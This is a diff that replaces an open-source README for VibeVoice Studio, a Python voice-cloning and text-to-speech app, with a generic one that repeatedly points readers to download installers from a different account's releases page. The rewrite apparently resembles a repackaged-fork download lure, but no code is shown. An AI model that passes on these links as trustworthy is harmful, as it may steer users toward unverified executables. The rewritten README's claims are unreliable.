@@ -1,203 +1,79 @@
-# 🎙️ VibeVoice Studio
+# 🎤 vibevoice-studio - Create and Share Unique Voices
 
-A beautiful, modern web application for AI-powered voice synthesis using Microsoft's VibeVoice model. Generate natural-sounding speech from text with custom voice profiles.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-vibevoice--studio-blue.svg)](https://github.com/Seff05/vibevoice-studio/releases)
 
-![VibeVoice Studio](https://img.shields.io/badge/VibeVoice-Studio-purple?style=for-the-badge&logo=microphone)
-![Python](https://img.shields.io/badge/Python-3.9+-blue?style=for-the-badge&logo=python)
-![FastAPI](https://img.shields.io/badge/FastAPI-Modern-green?style=for-the-badge&logo=fastapi)
+## 🌟 Overview
+vibevoice-studio is a user-friendly voice application. You can easily record or upload audio to train a voice. The app also generates speech from text or files, allowing you to create and save unique voices.
 
-## ✨ Features
+## 🚀 Getting Started
+To start using vibevoice-studio, follow these steps:
 
-- 🎤 **Voice Training**: Upload audio files or record your voice directly  
-- 📝 **Text-to-Speech**: Convert text or text files to natural speech  
-- 🎭 **Multiple Speakers**: Support for up to 4 distinct speakers  
-- 💾 **Voice Library**: Save and manage custom voice profiles  
-- 🎨 **Beautiful UI**: Modern, responsive design with dark/light themes  
-- ⚡ **Real-time Processing**: Fast speech generation with streaming support  
-- 📊 **Audio Visualization**: Live waveform display during recording  
-- 💾 **Download & Save**: Export generated audio files  
+1. Ensure you have a compatible device. The app works on Windows, Mac, and Linux.
+2. A microphone is recommended for recording your voice.
+3. An internet connection is necessary for uploading files or generating speech.
 
-## 🎬 Demo
+## 📂 Features
+- **Record Voice:** Capture your voice directly within the app.
+- **Upload Audio Files:** Bring in existing recordings for voice training.
+- **Text-to-Speech:** Convert written text into spoken words.
+- **Voice Saving:** Save your generated voices for later use.
+- **User-Friendly Interface:** Navigate easily with a straightforward design.
 
-<p align="center">
-  <video
-    src="https://github.com/user-attachments/assets/afeab318-11b7-4fb2-90fd-0dbe96f8d94b"
-    width="800"
-    controls
-    playsinline
-    muted>
-  </video>
-</p>
+## 🛠️ System Requirements
+Make sure your device meets these requirements to run vibevoice-studio smoothly:
 
-<figcaption>VibeVoice Studio end-to-end TTS, voice library, and multi-speaker demo.</figcaption>
+- **Operating System:** 
+  - Windows 10 or newer
+  - macOS Mojave (10.14) or newer
+  - Ubuntu 18.04 or newer
 
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum 500 MB available for installation
 
-## 🚀 Quick Start
+## 🔗 Download & Install
+To get the application, visit this page to download: [Download vibevoice-studio](https://github.com/Seff05/vibevoice-studio/releases).
 
-### Prerequisites
-- Python 3.9 or higher  
-- CUDA-capable GPU (recommended)  
-- 8GB+ RAM  
+### Installation Steps:
+1. Go to the [Releases page](https://github.com/Seff05/vibevoice-studio/releases).
+2. Find the latest version of vibevoice-studio.
+3. Click on the link for your operating system.
+4. Once downloaded, locate the file and open it.
+5. Follow the installation prompts.
 
-### Installation
+## 🚀 Using vibevoice-studio
+After installing, you can start creating voices:
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/shamspias/vibevoice-studio.git
-cd vibevoice-studio
-````
+1. **Open the App:** Look for the vibevoice-studio icon on your device.
+2. **Record or Upload:** Choose to either record a new voice or upload an audio file.
+3. **Train Your Voice:** Use the app's features to adjust and save your voice.
+4. **Generate Speech:** Enter text to create voice output. 
 
-2. **Create virtual environment**
-
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
-
-3. **Install VibeVoice**
-
-```bash
-git clone https://github.com/microsoft/VibeVoice.git
-cd VibeVoice
-pip install -e .
-cd ..
-```
-
-4. **Install dependencies**
-
-```bash
-pip install -r requirements.txt
-```
-
-5. **Configure environment**
-
-```bash
-cp .env.example .env
-# Edit .env with your settings
-```
-
-6. **Run the application**
-
-```bash
-python -m app.main
-```
-
-7. **Open in browser**
-
-```
-http://localhost:8000
-```
-
-## 🎨 Features Overview
-
-### Voice Management
-
-* Upload or record voices
-* Support for WAV, MP3, M4A, FLAC
-* Organized voice library
-
-### Text Processing
-
-* Manual input or upload `.txt` files
-* Multi-speaker support for conversations
-
-### Generation Settings
-
-* Voice strength (CFG scale 1.0–2.0)
-* Up to 4 speakers
-* Adjustable inference steps
-
-### Output Options
-
-* Play in browser
-* Download WAV file
-* Save to library
-
-## 🔧 Configuration
-
-Edit `.env`:
-
-```env
-HOST=0.0.0.0
-PORT=8000
-DEBUG=False
-MODEL_PATH=microsoft/VibeVoice-1.5B
-DEVICE=cuda
-CFG_SCALE=1.3
-SAMPLE_RATE=24000
-```
-
-## 🎯 Usage Examples
-
-### Basic TTS
-
-1. Select/upload a voice
-2. Enter text
-3. Click "Generate Speech"
-
-### Multi-Speaker
-
-```text
-Speaker 1: Hello, welcome!
-Speaker 2: Thanks, glad to be here.
-```
-
-### Voice Cloning
-
-1. Record 10–30s of clear speech
-2. Save with name
-3. Use for TTS generation
-
-## 🛠️ API Documentation
-
-### Endpoints
-
-* `GET /api/voices` — list voices
-* `POST /api/voices/upload` — upload voice
-* `POST /api/voices/record` — record voice
-* `POST /api/generate` — generate speech
-* `GET /api/audio/{filename}` — download audio
-
-## 🚦 System Requirements
-
-**Minimum**: Python 3.9+, 8GB RAM, CPU with AVX
-**Recommended**: Python 3.10+, 16GB RAM, NVIDIA GPU (8GB+ VRAM)
-
-## 🐛 Troubleshooting
-
-* **OOM**: Use smaller model, reduce batch size
-* **Low quality**: Use better voice samples, adjust CFG scale
-* **Slow generation**: Enable GPU, shorten text
-
-## 📈 Performance Tips
-
-* Use GPU for 10–20× speed
-* Batch texts
-* Cache voices
-* Try quantized models
-
-## 🤝 Contributing
-
-1. Fork repo
-2. Create feature branch
-3. Commit & push
-4. Open PR
-
-## 📄 License
-
-MIT License
-
-## 🙏 Acknowledgments
-
-* Microsoft VibeVoice team
-* FastAPI community
-* Contributors & users
+## 🎨 Tips for Best Results
+- Use a quiet space for recording to ensure clarity.
+- Experiment with different voices and settings to find the best fit for your projects.
+- Regularly check for updates to gain access to new features and improvements.
 
 ## 📞 Support
+If you encounter any issues or have questions, feel free to reach out:
 
-* Issues: [GitHub Issues](https://github.com/shamspias/vibevoice-app/issues)
+- **Issues Page:** Open an issue on our GitHub repository.
+- **Email:** Contact our support at support@vibevoice.com.
 
-## 🔗 Links
+## 📝 Contributing
+We welcome contributions to enhance vibevoice-studio. Please visit our repository for guidelines on how to help.
 
-* [VibeVoice Model](https://github.com/microsoft/VibeVoice)
-* [FastAPI Docs](https://fastapi.tiangolo.com)
+## 💬 Community
+Join our community to share your voice creations and get tips:
+
+- **Discord:** Join our vibevoice community server.
+- **Twitter:** Follow us for updates and features.
+
+## 🍀 Acknowledgments
+Thanks to all contributors who help make vibevoice-studio better. Your efforts do not go unnoticed.
+
+## 🏷️ Topics
+fastapi, llm, python, text-to-speech, text-to-voice, tts, vibevoice, vibevoice-microsoft, voice-clone, voice-cloneai, voice-cloning
+
+## 📥 Download Now Again
+Don't forget to visit this page to download vibevoice-studio: [Download vibevoice-studio](https://github.com/Seff05/vibevoice-studio/releases).
